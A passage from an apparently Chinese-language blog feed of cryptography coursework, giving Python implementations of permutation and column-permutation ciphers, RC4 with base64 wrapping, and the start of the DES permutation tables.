    <span class="token keyword">return</span> ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="置换密码"><a href="#置换密码" class="headerlink" title="置换密码"></a>置换密码</h1><h2 id="Permutation-cipher"><a href="#Permutation-cipher" class="headerlink" title="Permutation cipher"></a>Permutation cipher</h2><p>给定一个顺序，例：1,4,5,3,2，然后将明文按照此顺序输出即可，例：abcde fghij -&gt; adecb fijhg</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">removePunctuation</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token builtin">filter</span><span class="token operator">=</span><span class="token string">'[^A-Z]'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> text<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">inverseKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 通过key获取解密时所需要的key的逆解 """</span>
    inverse <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        inverse<span class="token punctuation">.</span>append<span class="token punctuation">(</span>key<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> inverse

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    便于在之后对文本的遍历，首先将文本补齐，使其长度为密钥长度的整数倍
    然后开始分组遍历，通过对range参数的设置，使每次加密都对密钥长度的明密文进行加解密
    然后对组内明密文进行加解密
    """</span>
    plaintext <span class="token operator">=</span> removePunctuation<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        plaintext <span class="token operator">+=</span> <span class="token string">"X"</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 步长设置为密钥长度</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token punctuation">[</span>a <span class="token operator">-</span> <span class="token number">1</span> <span class="token keyword">for</span> a <span class="token keyword">in</span> key<span class="token punctuation">]</span><span class="token punctuation">:</span>
            cipher <span class="token operator">+=</span> plaintext<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span>
        cipher <span class="token operator">+=</span> <span class="token string">" "</span>
    <span class="token keyword">return</span> cipher<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 得到逆密钥，然后和加密一样 """</span>
    <span class="token keyword">return</span> encrypt<span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> inverseKey<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Column-permutation-cipher"><a href="#Column-permutation-cipher" class="headerlink" title="Column permutation cipher"></a>Column permutation cipher</h2><p>原理与置换密码相似，将明文按照key的长度排成矩阵，然后根据key中字母在字母表中的先后顺序输出每一列，即为密文<br>Double Translation Cipher即为两次列置换加密</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">removePunctuation</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token builtin">filter</span><span class="token operator">=</span><span class="token string">'[^A-Z]'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> text<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">sortind</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 通过key获取加密顺序 """</span>
    t1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    t2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token keyword">for</span> i<span class="token punctuation">,</span> k <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token punctuation">[</span>q<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> q <span class="token keyword">in</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>t2<span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">unsortind</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 通过key获取解密顺序 """</span>
    t1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token punctuation">[</span>q<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> q <span class="token keyword">in</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 加密函数 """</span>
    plain <span class="token operator">=</span> removePunctuation<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> <span class="token string">''</span>
    ind <span class="token operator">=</span> sortind<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        cipher <span class="token operator">+=</span> plain<span class="token punctuation">[</span>ind<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> cipher

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 解密函数 """</span>
    cipher <span class="token operator">=</span> removePunctuation<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>
    plain <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
    l<span class="token punctuation">,</span> m <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    ind <span class="token operator">=</span> unsortind<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    upto <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        collen <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>l <span class="token operator">/</span> m<span class="token punctuation">)</span>
        <span class="token keyword">if</span> ind<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> l <span class="token operator">%</span> m<span class="token punctuation">:</span>
            collen <span class="token operator">+=</span> <span class="token number">1</span>
        plain<span class="token punctuation">[</span>ind<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token punctuation">:</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span>upto<span class="token punctuation">:</span>upto <span class="token operator">+</span> collen<span class="token punctuation">]</span>
        upto <span class="token operator">+=</span> collen
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>NEU</category>
      </categories>
      <tags>
        <tag>CRYPTO</tag>
        <tag>NEU</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学实践（二）</title>
    <url>/2020/07/16/mi-ma-xue-shi-jian-er/</url>
    <content><![CDATA[<p>之前记录了替代和置换类加解密<br>这里为流密码部分代码</p>
<span id="more"></span>
<h1 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h1><h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> base64

<span class="token keyword">def</span> <span class="token function">KSA</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 密钥初始流程KSA """</span>
    key <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    S <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    K <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        S<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        K<span class="token punctuation">.</span>append<span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>K<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token keyword">return</span> S

<span class="token keyword">def</span> <span class="token function">PRGA</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 加解密算法 """</span>
    S <span class="token operator">=</span> KSA<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    outText <span class="token operator">=</span> <span class="token string">""</span>
    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> a <span class="token keyword">in</span> text<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        t <span class="token operator">=</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>

        c <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">^</span> S<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>
        outText <span class="token operator">+=</span> c
    <span class="token keyword">return</span> outText

<span class="token keyword">def</span> <span class="token function">encodeBase64</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" text to base64 """</span>
    text1 <span class="token operator">=</span> text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span>
    text2 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>text1<span class="token punctuation">)</span>
    text3 <span class="token operator">=</span> text2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> text3

<span class="token keyword">def</span> <span class="token function">decodeBase64</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" base64 to text """</span>
    text1 <span class="token operator">=</span> text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    text2 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>text1<span class="token punctuation">)</span>
    text3 <span class="token operator">=</span> text2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> text3

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 加密最终输出为base64串 """</span>
    plain <span class="token operator">=</span> encodeBase64<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> PRGA<span class="token punctuation">(</span>plain<span class="token punctuation">,</span> key<span class="token punctuation">)</span>
    <span class="token keyword">return</span> encodeBase64<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 因为之前输出是base64串，所以需要对其检验 """</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        cipher <span class="token operator">=</span> decodeBase64<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        plain <span class="token operator">=</span> PRGA<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> key<span class="token punctuation">)</span>
        <span class="token keyword">return</span> decodeBase64<span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="分块密码"><a href="#分块密码" class="headerlink" title="分块密码"></a>分块密码</h1><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><p>desMatrix.py<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 初始置换</span>
IP <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span>
      <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span>
      <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span>
      <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span>
      <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span>
      <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span>
      <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span>
      <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span>

<span class="token comment"># 末置换</span>
FP <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span>
      <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span>
      <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span>
      <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span>
      <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span>
      <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span>
      <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span>
      <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">]</span>

<span class="token comment"># 扩展置换</span>
E_Box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span>
         <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>
         <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span>
         <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span>
         <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span>
         <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>

<span class="token comment"># P盒</span>
